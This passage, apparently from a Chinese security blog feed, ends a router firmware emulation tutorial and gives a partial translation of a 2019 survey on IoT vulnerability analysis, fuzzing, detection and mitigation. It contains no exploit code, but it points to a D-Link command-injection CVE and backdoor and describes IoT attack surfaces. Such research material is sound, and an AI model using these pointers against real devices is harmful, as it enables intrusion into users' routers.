<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624982335259.png" alt="1624982335259"></p>
<p>从文件名可以猜到是个跟路由器界面语言选择有关的文件。</p>
<p>文件不长，注意到有个函数跟语言和硬件有关：</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624982776036.png" alt="1624982776036"></p>
<p>那么我们可以不让它运行到这个页面。</p>
<p>查找调用了*LangSelect.asp的页面，发现只有一个first.asp<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624984447102.png" alt="1624984447102"><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624984569909.png" alt="1624984569909"></p>
<p><em>SC是哪的LangCode，哪位大兄弟查到了的话麻烦告诉我一下</em></p>
<p>直接修改，重新运行完事<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624984880272.png" alt="1624984880272"></p>
<blockquote>
<p>这个固件成功运行后可以顺便看一看这个洞： <span class="exturl" data-url="aHR0cHM6Ly93aWtpLjk2Lm1rL0lPVCVFNSVBRSU4OSVFNSU4NSVBOC9ELUxpbmsvJUVGJUJDJTg4Q1ZFLTIwMTgtMjAwNTclRUYlQkMlODlELUxpbmslMjBESVItNjE5TCUyNjYwNUwlMjAlRTUlOTElQkQlRTQlQkIlQTQlRTYlQjMlQTglRTUlODUlQTUlRTYlQkMlOEYlRTYlQjQlOUUv">（CVE-2018-20057）D-Link DIR-619L&amp;605L 命令注入漏洞 - Wiki <i class="fa fa-external-link-alt"></i></span> ，直接用了后门</p>
</blockquote>
<p>这节的错误解决方法均通过修改指令，《路由器0day》书中的方法是伪造.so来劫持函数，也值得一学：<span class="exturl" data-url="aHR0cHM6Ly9wMWtrLmdpdGh1Yi5pby8yMDIwLzA0LzE1LyVFOCVCNyVBRiVFNyU5NCVCMSVFNSU5OSVBOC8lRTglQjclQUYlRTclOTQlQjElRTUlODglODYlRTYlOUUlOTAv">分析固件第一步<i class="fa fa-external-link-alt"></i></span></p>
<h1>0x6 结束</h1>
<p>感觉算是一个很不错的IoT固件分析入门教程，今天收到《路由器0day》后在路上粗略地看了下目录，除了专门的漏洞分析外，这个教程差不多把纯固件分析的要点都涉及到了（至于是不是 a bit out of date 就另当别论，不过感觉也还好⑧）</p>
]]></content>
      <tags>
        <tag>IoT</tag>
      </tags>
  </entry>
  <entry>
    <title>【翻译】A Survey of Security Vulnerability Analysis,Discovery, Detection, and Mitigation on IoT Devices</title>
    <url>/62497.html</url>
    <content><![CDATA[<p>在前面：<br>
完整阅读完的第一篇论文。这篇出自2019年MDPI的Future Internet，虽然最近两年出了更新的成果和趋势，但也本文也没有太过时，算是讲全了IoT研究的发展和角度。<br>
翻译和自己阅读还是挺不一样的，发现了自己语文水平蒟蒻，连啥时候用逗号都把握不住… DeepL 和 Google Translate 还是各有千秋。</p>
<blockquote>
<p>文章由本人首发于安全客：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMjQ0NzEx">IoT设备安全漏洞分析、挖掘、检测和缓解综述 - 安全客，安全资讯平台 (anquanke.com)<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<span id="more"></span>
<h1>IoT设备安全漏洞分析、挖掘、检测和缓解综述</h1>
<p>来源：<span class="exturl" data-url="aHR0cDovL25ldHNlYy5jY2VydC5lZHUuY24vY2hzL3B1YmxpY2F0aW9ucy9mdXR1cmVpbnRlcm5ldDIwLWlvdA==">http://netsec.ccert.edu.cn/chs/publications/futureinternet20-iot<i class="fa fa-external-link-alt"></i></span></p>
<!-- vscode-markdown-toc -->
<ul>
<li>
<ol>
<li><a href="#">摘要</a></li>
</ol>
</li>
<li>
<ol start="2">
<li><a href="#-1">介绍</a></li>
</ol>
</li>
<li>
<ol start="3">
<li><a href="#-1">背景</a></li>
</ol>
<ul>
<li>3.1.<a href="#IoT">IoT架构</a></li>
<li>3.2.<a href="#-1">设备构成</a></li>
<li>3.3.<a href="#-1">攻击面</a>
<ul>
<li>3.3.1.<a href="#-1">硬件层</a></li>
<li>3.3.2.<a href="#-1">软件层</a></li>
<li>3.3.3.<a href="#-1">协议接口层</a></li>
</ul>
</li>
</ul>
</li>
<li>
<ol start="4">
<li><a href="#-1">漏洞分析、挖掘、检测和缓解</a></li>
</ol>
<ul>
<li>4.1.<a href="#-1">漏洞分析的基础框架研究</a></li>
<li>4.2.<a href="#-1">漏洞挖掘技术研究</a>
<ul>
<li>4.2.1.<a href="#-1">动态分析方法</a></li>
<li>4.2.2.<a href="#-1">静态分析方法</a></li>
</ul>
</li>
<li>4.3.<a href="#-1">漏洞检测研究</a>
<ul>
<li>4.3.1.<a href="#-1">网络扫描</a></li>
</ul>
</li>
<li>4.4.<a href="#-1">相似性检测</a>
<ul>
<li>4.4.1.<a href="#-1">源代码相似性检测</a></li>
<li>4.4.2.<a href="#-1">二进制代码相似性检测</a></li>
</ul>
</li>
<li>4.5.<a href="#-1">漏洞缓解研究</a>
<ul>
<li>4.5.1.<a href="#-1">自动化生成补丁</a></li>
<li>4.5.2.<a href="#-1">访问控制</a></li>
</ul>
</li>
</ul>
</li>
<li>
<ol start="5">
<li><a href="#-1">讨论</a></li>
</ol>
<ul>
<li>5.1.<a href="#-1">评估</a></li>
<li>5.2.<a href="#-1">难点</a>
<ul>
<li>5.2.1.<a href="#1ComplexityandHeterogeneityofDevice">（1）设备的复杂性和异构性（Complexity and Heterogeneity of Device）</a></li>
<li>5.2.2.<a href="#2Limitationsofdeviceresources">（2）设备资源的限制（Limitations of device resources）</a></li>
<li>5.2.3.<a href="#3Closed-SourceMeasures">（3）闭源措施（Closed-Source Measures）</a></li>
</ul>
</li>
<li>5.3.<a href="#-1">机会</a>
<ul>
<li>5.3.1.<a href="#1AI">（1）AI技术的应用</a></li>
<li>5.3.2.<a href="#2">（2）对第三方和开源代码的依赖</a></li>
<li>5.3.3.<a href="#3">（3）外围设备系统的开发</a></li>
</ul>
</li>
</ul>
</li>
<li>
<ol start="6">
<li><a href="#-1">研究方向</a></li>
</ol>
</li>
<li>
<ol start="7">
<li><a href="#-1">结论</a></li>
</ol>
</li>
</ul>
<!-- vscode-markdown-toc-config
	numbering=true
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->
<!--more-->
<h2 id="1-a-name-a-摘要">1. <code>&lt;a name=''&gt;&lt;/a&gt;</code>摘要</h2>
<p>随着IoT产业的兴盛，多种多样的IoT设备开始迅速发展，智能家居、智能穿戴、智能制造、智能汽车等一系列和生活相关的领域得到大量使用。随之而来的是层出不穷的IoT设备上的漏洞。安全问题的增加会对用户的隐私和财产带来严重威胁。本文首先介绍了研究背景，包括IoT架构、设备构成和攻击面。我们回顾了有关IoT设备漏洞挖掘、检测、缓解技术最前沿的研究，随后通过评估指出了现在面临的困难和机会，最后预测和讨论了IoT设备上漏洞分析技术的研究方向。</p>
<h2 id="2-a-name-1-a-介绍">2. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>介绍</h2>
<p>IoT正在成为最广泛和实用的在线平台。它将大量的传感器和控制器联网，帮助人们实现和万物之间的无缝通信。IoT正在成为互联网未来的关键，特别是近几年，随着IoT产业的兴盛，多种多样的IoT设备开始迅速发展，全球活跃的IoT设备已经达到70亿[^1]，它们在智能家居、智能穿戴、智能制造、智能汽车等一系列和生活相关的领域广泛使用，我们认为这会极大提升我们的生活质量。同时，IoT设备的安全问题经常发生，也难以解决。惠普的报告表明70%的IoT设备包含安全漏洞，平均每台设备有25个漏洞[^2]。攻击者利用这些漏洞控制设备，进行一系列非法的活动。最著名的例子是在2016年Mirai病毒控制了成百上千台IoT设备，用这些设备建造了一个僵尸网络发动TB级的dos攻击，攻击目标包括DNS服务提供商Dyn，这次攻击造成了严重的后果，包括导致美国部分的网络瘫痪[^3]。总的来说，随着IoT设备的广泛使用、安全漏洞的增加会对用户的隐私和安全，甚至人类的生活和财产带来严重威胁。面对频繁的攻击，IoT安全研究变得越来越流行。在美国Auto-ID于1999年第一次提出“物联网”的概念[^4]后，安全研究者们投身于IoT行业，研究安全架构和通信的标准[^5,^6]。随后产生了许多关于IoT安全的问题[^7-^12]。Zhang等人[^13]、Mahmoud等人[^14]指出了面临的问题和研究方向，于是，研究者开始在IoT安全领域使用传统安全研究的方法[^15]。随着AI的发展，将机器学习和深度学习应用于IoT安全上的概念开始产生[^16]。Alrawi等人[^17]，系统的总结了智能家居中设备、手机应用、云端和通信的IoT攻击点。Xie等人[^18]总结及了检测IoT漏洞的技术。最近，Zheng等人[^19]发表了IoT漏洞挖掘的技术概论。在上述的两篇论文中，漏洞挖掘和漏洞检测的界限较为模糊。在本文中，漏洞挖掘的技术即挖掘未知的漏洞，漏洞检测指针对已知漏洞的检测。通过以上调查，我们发现现有的研究关注于IoT安全问题，缺少分析技术，其次，漏洞分析技术的重点在漏洞挖掘和检测，缺少漏洞缓解技术，综上，现有的IoT安全的技术总结还不够全面。为了解决前面提到的问题，我们希望对以下个方面做出一些贡献：</p>
<ul>
<li>首先，我们把重点从IoT架构转移到IoT设备；其次，精简IoT设备安全技术的分类；另外我们总结了现有的研究，包括漏洞分析的基础框架、挖掘未知的漏洞、检测已知的漏洞、漏洞缓解</li>
<li>我们评估了现有的关于IoT设备漏洞分析的研究。除此之外，我们深入分析了阻碍安全研究技术发展的原因，指出了面临的困难和机会</li>
<li>我们回顾了技术发展的背景，并为相关研究者提出了未来研究的方向</li>
</ul>
<p>这篇论文的结构如下：第二节描述了IoT安全的背景，介绍了IoT设备的架构、设备构成和攻击面；第三节回顾了已有的IoT设备安全研究，包括漏洞分析、挖掘、检测和缓解；第四节基于对漏洞分析技术的评估，总结了目前遇到的问题和机会；第五节提出了未来研究的热点方向；第六节对论文进行了总结</p>
<h2 id="3-a-name-1-a-背景">3. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>背景</h2>
<h3 id="3-1-a-name-IoT-a-IoT架构">3.1. <code>&lt;a name='IoT'&gt;&lt;/a&gt;</code>IoT架构</h3>
<p>随着网络的快速发展，越来越多的家用和工业设备开始联网，给我们带来了多元化的生活。物联网架构主要有两个发展方向：消费者层面和产业层面<br>
在消费者层面，如果我们将它们按照应用场景划分，有几类设备类型例如工业制造、智能家居、智能医疗和智能汽车，其中智能家居的发展相对成熟。互联网巨头——三星、谷歌、苹果和小米占据大部分市场份额，同时，它们也发布了SmartThings[^20]、Google Weave[^21]、Apple HomeKit[^22]、HomeAssistant[^23] 和 XiaoMi IoT[^24]等物联网平台。通过调查这些平台，我们发现绝大多数IoT遵循“设备&lt;-&gt;云端&lt;-&gt;用户”这一架构（如图1）。<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210613122500.png" alt="20210613122500"><br>
智能设备大部分都放在家中，它们和云服务器进行通信，然后直接或间接通过WiFi[^25]、ZigBee[^26]、蓝牙[^27]或其他协议接入网络。它们上传传感器收集的数据，接收发送给执行单元的控制命令。IoT架构不仅依赖供应商的云，同时也依赖第三方的云，它们相互支持，并为各种功能提供多样化的服务。用户可以通过手机或者电脑连接云查看状态并下载数据。对于一些简单场景例如可穿戴设备，“设备&lt;-&gt;用户”架构更加实用。</p>
<p>对于产业层面，IoT架构延续了IT的做法，通过服务器集中管理用户和设备的交互（如图2），区别是设备首先通过OT和PLC进行通信。因此产业中的设备等同于PLC和“传感器+执行器”。安全研究的重点在于PLC。“设备&lt;-&gt;用户”架构也存在于产业物联网：管理员用配置软件控制设备。虽然面向用户的工业终端例如智能仪表也尝试了云的模式，但基于安全考虑没有得到广泛使用<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210617205408.png" alt="20210617205408"></p>
<h3 id="3-2-a-name-1-a-设备构成">3.2. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>设备构成</h3>
<p>不论是汽车制造中大而复杂的机器，亦或穿戴设备里小巧智能的手环，它们都包含了相对固定的零件例如芯片、闪存、固件等。它们主要包含硬件和软件部分</p>
<ol>
<li>硬件</li>
</ol>
<ul>
<li>逻辑芯片：对于复杂的设备来说，它们需要多个逻辑芯片或cpu来运行内置的操作系统；对于简单的嵌入式设备或许只需要一个微处理器来运行程序</li>
<li>内存：为系统和程序运行提供空间，大小从KB到GB不等</li>
<li>闪存：储存IoT设备固件。部分设备的bootloader也存放在闪存</li>
<li>网络模块。IoT设备和传统嵌入式设备的区别就是前者连接了网络。他们通常采用无线技术连接到互联网，如AP</li>
<li>串行调试接口：IoT设备需要与外部进行通信，以便调试。串行调试接口可以让开发人员发送和接收命令。最常见的接口是通用异步接收器/发送器UART</li>
</ul>
<ol start="2">
<li>软件</li>
</ol>
<ul>
<li>Bootloader：在IoT设备系统启动前，它初始化了硬件设备，将固件加载到引导设备。它使系统的软件和硬件环境达到合适的状态</li>
<li>固件：固件包括了操作系统、文件系统和一系列服务程序。IoT设备上的安全研究通常从固件分析开始</li>
</ul>
<h3 id="3-3-a-name-1-a-攻击面">3.3. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>攻击面</h3>
<p>针对IoT设备的攻击面不仅包括传统软件安全领域，因为它们的特殊结构和功能，也包括了新的攻击领域。根据IoT架构和设备构成，攻击面可以分为三个层面（图3）</p>
<ul>
<li>图3<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210613163604.png" alt="20210613163604"></li>
</ul>
<h4 id="3-3-1-a-name-1-a-硬件层">3.3.1. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>硬件层</h4>
<p>硬件层面的攻击不同于传统的安全领域，它主要包括三个角度：不安全的调试接口、未保护的闪存芯片、硬件敏感信息的泄露</p>
<ol>
<li>不安全的调试接口当IoT设备被制造的时候，调试接口比如UART会被留在电路板上以便维修。如果它缺少身份验证或者仅有弱身份验证，攻击者就可以通过接口来获得高权限，对固件进行修改或者替换。调试接口在IoT安全检查中排在第一位</li>
<li>未保护的闪存芯片因为闪存通常用来存储固件，因此也成为了关注的重点。如果芯片没有读写保护，安全研究者就可以通过读取固件来分析或者修改固件，来绕过接口的身份验证</li>
<li>硬件敏感信息的泄露<br>
硬件电路的密封性并不好，诸如声音和电量消耗的硬件信息泄露可以造成侧信道攻击[^28-^31]，攻击者可以由此获得重要的信息，比如密钥。</li>
</ol>
<h4 id="3-3-2-a-name-1-a-软件层">3.3.2. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>软件层</h4>
<p>软件层面的攻击对应着设备构成中bootloader和固件的软件部分，它主要包括以下五个方面：不安全的bootloader、不安全的操作系统、固件敏感信息泄露、不安全的应用服务、不正确的配置策略</p>
<ol>
<li>不安全的bootloader因为bootloader是一段在设备运行后加载的代码，因此是一个容易被忽略的攻击点。它的功能是初始化并加载固件，因此当问题出现时它的危险程度很高。例如checkm8这个Boot ROM 漏洞被称为是iphone、ipad、apple TV和 apple watch上的史诗级漏洞</li>
<li>不安全的操作系统由于研发周期短和轻量化的需求，IoT设备的操作系统内核是定制的，版本也不经常更新，这导致了大量的缓冲区溢出问题，如提权等。除此之外，设备使用了各种各样的传感器和通信模块，包括内核中大量的驱动。例如，Marvell WiFi芯片驱动找到了多个漏洞，包括 CVE-2019-14901, CVE-2019-14897 和CVE-2019-14896，它们导致了内核中基于栈或堆的缓冲区溢出。这也是攻击面中重要的一部分</li>
<li>固件敏感信息泄露IoT设备的本地存储通常使用轻量化的存储方案，开发者通常忽略了它的安全性，并使用了明文或只是进行了简单的加密，这很容易导致敏感数据的泄露</li>
<li>不安全的应用服务应用服务开发缺少安全标准。为了加快产品的开发，通常直接编译、使用了简单、不安全的应用代码，因此引入未知的漏洞。IoT安全研究者们已经发现了大量开发时产生的应用漏洞，包括出于未知原因留下的后门</li>
<li>不正确的配置策略<br>
为了方便管理IoT设备，ssh、telnet等服务是默认的开启，这样会造成配置问题。默认配置下的弱验证策略使攻击者容易获得设备的权限。例如，Telestar Digital GmbH 的物联网收音机可通过未经验证的telnet服务器被远程攻击者劫持利用[^34]，这些漏洞已经被CVE-2019-13473[^35]和CVE-2019-13474[^36]收录。</li>
</ol>
<h4 id="3-3-3-a-name-1-a-协议接口层">3.3.3. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>协议接口层</h4>
<p>协议接口层的攻击包括了通信和API，它涉及到用户侧直接控制和由云端间接控制的设备，以及以上两种通信过程中的信息保护问题，并不涉及到协议的安全。例如，IoT通信协议的滥用和AR-Ddos[^37]攻击正是通过IoT通信协议CoAP[^38]、SSDP[^39]和SNMP执行的，它的目标不是IoT设备，但是它也是IoT安全一个重要的研究方向。协议接口层的攻击主要包括一下三个角度：不安全的远程管理接口、数据传输过程中的信息泄露、弱身份验证</p>
<ol>
<li>不安全的远程管理接口为了方便管理，IoT设备使用http服务之类的远程管理方式，这带来了诸多漏洞，例如sql注入、XSS和远程执行漏洞等</li>
<li>数据传输过程中的信息泄露IoT通信协议使用了弱加密算法或者根本不进行加密，导致敏感信息泄露。例如论文<em>Passwords in the Air</em>[^40]中提到的，当IoT设备接入网络时，WiFi密码以明文传输</li>
<li>弱身份验证<br>
由于安全需要，管理IoT设备需要身份验证绑定，于是产生了一个新的攻击面。攻击者可以绕过身份验证，重复绑定然后获得用户的信息，论文<em>Phantom Device Attack</em>[^41]在这个攻击面上找到了四种攻击方法</li>
</ol>
<h2 id="4-a-name-1-a-漏洞分析、挖掘、检测和缓解">4. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>漏洞分析、挖掘、检测和缓解</h2>
<p>现阶段，对IoT安全没有精确的分类，此外，安全研究的核心在于漏洞，因此我们把重点放在设备的漏洞。在研究周期中，研究分为三个阶段：挖掘、检测和缓解。因为IoT安全的特殊性导致不可能有用于分析的标准接口，因此，针对物联网的基础分析框架的研究内容也很有价值。为了审视现有的物联网安全技术，我们从以下四个角度进行总结：（1）漏洞分析的基础框架的研究，使用了固件模拟来帮助分析IoT安全问题；（2）漏洞挖掘技术研究，主要针对挖掘IoT设备中的未知漏洞的手段；（3）漏洞检测，研究基于现有漏洞的特征来检测已知漏洞；（4）漏洞缓解技术的研究，研究了自动修复漏洞或者加入访问控制来限制恶意行为。另外，这节总结的IoT漏洞分析技术需要一系列前提条件，例如固件提取[^42]，因此我们标注了技术要求，但并不总结它们。</p>
<h3 id="4-1-a-name-1-a-漏洞分析的基础框架研究">4.1. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>漏洞分析的基础框架研究</h3>
<p>为了解决人们对物联网安全的担忧，即使没有源代码或者硬件资料，对固件二进制文件的准确分析也极为重要[^43]。然而，由于缺少专门的基础框架，IoT安全领域的漏洞分析收到了阻碍。例如，动态分析依赖于在可控的环境（通常是设备化的模拟器[^43]）中执行程序，因此基础框架主要提供了通过半仿真和全仿真的功能。它可以进行复杂的动态分析以支持IoT安全研究。**技术要求：**能够获得IoT设备固件对于缺少专门用于分析固件，特别是用于动态分析的工具，Avatar[^43]提出了一个结合了在模拟器上的模拟执行模式和在真实设备上的实际执行模式的框架来分析固件。当固件在模拟模式下运行时，当发生I/O时，Avatar将操作转发到设备，设备执行操作后将结果传给模拟器，以便模拟器继续运行。它有效地应对了特定外围设备缺少源码和文档的问题。随后，Prospect[^44]和Surrogate[^45]也提出了类似的动态分析框架。四年后，Avatar开发团队开发出了Avatar2[^46]，允许安全研究者在不同动态分析框架、调试器、模拟器和实际设备之间交互操作，除此之外，作者还展示了如何使用Avatar2来记录设备的执行流。Chen等人[^47]提出了用于linux设备的Firmadyne，首先使用软件进行系统仿真，然后采用扫描和探测等动态分析方法来挖掘漏洞。以上框架的模拟功能都基于QEMU[^48]。对于不易模拟的传感器操作，半模拟框架[^43-^46]在执行表1的固件指令时，通过软件代理的方式引导对物理硬件的I/O操作</p>
<ul>
<li><strong>表1</strong>是漏洞分析基础框架的总结。<br>
Semi-simulation指的是框架需要真实的设备来进行I/O访问<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210613214401.png" alt="20210613214401"></li>
</ul>
<h3 id="4-2-a-name-1-a-漏洞挖掘技术研究">4.2. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>漏洞挖掘技术研究</h3>
<p>随着IoT设备漏洞的增加和攻击趋势的上升，安全研究者在设备的漏洞挖掘上花费越来越多时间。这一届表述了漏洞挖掘的技术，包括动态和静态分析。通过学习传统的软件安全分析技术，我们发现动态分析主要包括fuzz[^49]和污点检测[^50]，静态分析主要包括符号执行[^51]、污点分析、数据流分析[^50]。</p>
<h4 id="4-2-1-a-name-1-a-动态分析方法">4.2.1. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>动态分析方法</h4>
<p>动态分析方法需要仿真固件工具来进行动态调试，或者在物理设备上进行片上调试，来获得反馈信息。主要通过fuzz来得到漏洞的触发点<br>
**技术要求：**在IoT设备上进行动态调试的能力<br>
在卡片安全研究领域，Alimi等人[^52]使用了一个通用的算法生成测试样本，对手机卡和银行卡进行fuzz。对于现在一些内置web服务器的智能卡片，Kamel等人[^53]发现了一些基于HTTP协议生成方式的bug，并据此对web服务器进行了fuzz。在汽车安全领域，Koscher[^54]和Lee[^55]通过修改发送给CAN的数据包来改变汽车的状态[^56]，来对汽车的智能系统进行fuzz。<br>
因为IoT固件提取的困难，IoTFuzzer[^57]通过从用户侧捕获崩溃信息来避免了这个问题。首先，它在手机应用中的交互协议代码里插桩，然后修改从桩获取的数据，最后根据心跳包（Heartbeat packet）和响应来判断fuzz的效率。因为设备很难直接调试，研究者开始结合仿真技术来发现漏洞。Costin等人[^58]实现了应用动态固件分析技术来进行嵌入式固件镜像中web接口的漏洞自动化挖掘框架。最近，Srivastava等人的目标不再仅限于web接口，他们展示了FirmFuzz[^59]，一个独立于设备的、针对Linux固件镜像的自动化仿真和动态分析框架。Zheng等人[^60]提出了Firm-AFL，它是第一个针对IoT固件的高吞吐量灰盒fuzzer，他们扩展了AFL[^61]，把它变成了现在IoT领域最流行的fuzzer。对于fuzz的研究，Muench等人分析了传统的IoT设备异常状态检测方法的通用性，然后实现了一个基于Avatar[^43]和[^63]的系统，另外，他们比较了黑盒fuzzer在不同配置下的吞吐量，包括本机执行（直接向硬件输入）、部分仿真（仅将硬件请求重定向到硬件）、全仿真[^60]，这是一项对漏洞分析技术性能的评估。上述提到的动态分析技术发现的漏洞类型详见表2，主要是内存问题例如缓冲区溢出和空指针解引用，由于对web接口进行了研究，也有一些web服务器漏洞例如XSS、SQL注入。</p>
<h4 id="4-2-2-a-name-1-a-静态分析方法">4.2.2. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>静态分析方法</h4>
<p>静态分析不需要运行固件就可以挖掘漏洞。寻找bug的过程可以理解程序代码，因此它具有可扩展性。**技术要求：**能够获得IoT设备的固件静态分析步骤如下：（1）提取固件，（2）逆向固件中的程序，（3）通过人工审计找到安全问题。在学术界，研究人员主要探索通过自动化静态分析方法来找到漏洞。在表2，我们总结了静态分析的研究目标、细分的技术和发现的漏洞种类。Costin等人[^64]首先自动化分析了大量嵌入式设备的固件。他们自动解压运行了固件，然后使用模糊哈希来匹配固件中的弱密钥。FIE[^65]基于KLEE[^66]构建了嵌入式设备的符号执行引擎。它制定了内存规范、中断规范、芯片规范，以发现固件中违反自定义安全规范的问题。Firmalice[^67]也是一个基于符号执行的框架，它通过后门的输入确定性来找到身份验证绕过漏洞。SainT[^68]和DTaint[^69]提出了静态污点分析方法，分别在设备软件或二进制代码上挖掘漏洞。</p>
<ul>
<li><strong>表2</strong>：<br>
BO=缓冲区溢出漏洞；NPD=空指针解引用；CL=命令注入；CSRF=跨站请求伪造<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210614224801.png" alt="20210614224801"></li>
</ul>
<h3 id="4-3-a-name-1-a-漏洞检测研究">4.3. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>漏洞检测研究</h3>
<p>前面提到的动态和静态分析技术也可以应用于检测已知的漏洞。在大规模的检测场景，动态分析依赖于使用架构专用的工具来执行程序，静态分析检测已知漏洞的方式和发现0day漏洞的方式相同，但提高了性能和耗时。目前，研究者主要使用以下两种方法：网络扫描和代码相似性检测。</p>
<h4 id="4-3-1-a-name-1-a-网络扫描">4.3.1. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>网络扫描</h4>
<p>网络扫描通过向在线的IoT设备服务发送带有payload的探测包来检测已知漏洞。网络扫描在安全领域更为通用，随着IoT安全的发展，产生了网络扫描物联网设备的议题。<br>
**技术要求：**了解漏洞的有关信息，如POC<br>
Cui等人[^70]扫描了网络上存在的嵌入式设备，发现了一系列设备含有弱密码和其他漏洞。在2013年后，搜索引擎例如Shodan[^71]和Censys[^72]以及Zoomeye[^73]产生了，它们能够识别和检测弱密码、后门、和已知的漏洞。然而，仅靠外部扫描只能发现一小部分漏洞，而且，未授权扫描联网设备也存在道德问题。因此，网络扫描漏洞常常在内网和实验室中进行。网络扫描的优点在于从服务层进行检测并不需要考虑设备的结构，并且它高效快速，适合大规模测试。现有的商用漏洞检测系统大多基于这种方法。</p>
<h3 id="4-4-a-name-1-a-相似性检测">4.4. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>相似性检测</h3>
<p>由于IoT设备中存在大量没有修复过的已知漏洞，安全研究员们提出软件代码相似性检测方法来检测已知漏洞。在现阶段，相似性检测的研究主要针对传统软件安全领域，然后通过跨架构逐步支持物联网设备，而不存在专门研究IoT固件相似性检测的论文。如图4，相似性检测的基本思路是从代码中提取原有特征，如字符串、指令序列、基本块、语法树和函数调用图等，接着，通过算法测量特征的相似度，最终确定相应的代码片段中是否存在漏洞。<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210615165124.png" alt="图4.相似性检测结构"></p>
<p>**技术要求：**获得IoT设备固件</p>
<h4 id="4-4-1-a-name-1-a-源代码相似性检测">4.4.1. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>源代码相似性检测</h4>
<p>对于在源代码上检测已知漏洞， CP-Miner[^74]提出了基于token的方法，使了用词法分析器来产生token序列，然后搜索重复的token序列来衡量相似性。ReDeBug[^75]提出了一个可扩展的方法，它结合代码补丁来确定修复前的漏洞代码的特征，并且可以识别未打补丁的代码。然而，以上基于源代码的方法并没有应用在IoT上，在绝大多数情况下，安全研究员们无法获得固件的源代码。</p>
<h4 id="4-4-2-a-name-1-a-二进制代码相似性检测">4.4.2. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>二进制代码相似性检测</h4>
<p>对于在二进制代码上检测已知漏洞，研究者主要面临的问题是，不同的编译器代码生成算法、编译优化选项以及不同指令集导致难以检测相似性。N-Grams[^67]和N-Perms[^77]是早期的漏洞搜索方法[^78]。Karim等人使用内存中的二进制片段或代码来匹配算法，由于没有对代码语义进行了解，这种方法难以应对不同编译级别带来的指令重排序问题。为了提升匹配的准确性，Tracelet-based[^80]提出将代码重构为可执行序列，然后使用求解器来处理程序约束和数据约束，因此它解决了指令重排序的问题。此外，TEDEM[^81]采用符号简化二进制程序，并通过树编辑距离作为基本块来判断代码相似性，它甚至可以找到不同操作系统的漏洞。<br>
由于一些相同的语义特征，导致难以表示两个二进制程序基本块特征相似性。研究者开始考虑使用CFG[^82]来描述程序的行为，因此可以通过图来进行相似性比较。BinDiff[^83]和Binslayer[^84]能够通过检测CFG相似度，来检查两个二进制程序的相似性，不过它们并不是专门为漏洞检测设计的。通过比较两个完全不同的二进制文件的CFG，还是难以发现跨平台的漏洞片段。Egele等人[^85]提出了Blanket Execution 并指出，基于静态分析的二进制语义相似性研究容易受编译链和编译优化级别的影响。因此他们建议提取程序动态运行时的特征，来应对造成CFG改变的影响。BinHunt[^86]和iBinHunt[^87]使用了符号执行和理论证明，来检查基本块之间的语义等价性，并找出哪些语义有所不同。<br>
然而不同IoT设备的固件差异很大，包括多种架构如MIPS、ARM、PPC、x86等，它们的操作码、寄存器名称和内存寻址方式都有差别，因此，以上提到的方法难以应用于大规模的跨架构代码漏洞检测。直到最近两三年，研究人员开始研究二进制代码基础上的跨架构代码相似性检测[^88-^90]。Multi-MH[^88]是第一个基于二进制代码的跨架构代码相似性检测方法。首先，将二进制代码转换为中间代码，然后使用特定的输入来测试程序，并根据I/O的行为来捕获基本块的语义，最后根据捕获的CFG来检测漏洞。然而它在处理大量函数时的性能开销过大。DiscovRE[^89]通过图匹配算法检查一组函数对的CFG是否相似，并通过预筛选来加快CFG匹配过程。然而它的预筛选过程并不可靠且会漏报过多漏洞。BinGo[^90]通过引入选择性内联相关库函数以及用户定义的用于跨平台代码搜索的函数来捕捉完整功能语义。然而它并不是特别为IoT设备设计的。Genius[^91]使用机器学习的传统方式，从CFG学习高层特征表征。另外，它将图嵌入[^92]编码为一个高位数字特征向量，然后使用图匹配算法测量目标函数和一组二进制函数的相似性，这可以有效的提升性能和可扩展性。Xu等人[^93]首先提出了基于深度学习的跨架构二进制代码相似性检测方法，使用了神经网络模型的图嵌入技术。在跨版本代码相似性检测，αDiff[^94]迈出了重要的一步。它基于DNN模型，提取了三个语义特征，包括函数、功能间和模块间的特征，来进行检测。Gao等人提出了VulSeeker[^95]和VulSeeker-Pro[^96]。这些漏洞搜索方法都通过与深度学习结合，来提高检测的准确性，后面提到的两种方法被证实比目前其他的（例如Gemini[^93]）方法准确度都高。</p>
<h3 id="4-5-a-name-1-a-漏洞缓解研究">4.5. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>漏洞缓解研究</h3>
<p>在漏洞挖掘和检测的基础上，漏洞缓解措施也是行业关注的一个研究问题。根据公开的文献研究，主要研究热点是自动化生成补丁和访问控制。前者旨在修复漏洞，后者研究如何限制恶意行为。</p>
<h4 id="4-5-1-a-name-1-a-自动化生成补丁">4.5.1. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>自动化生成补丁</h4>
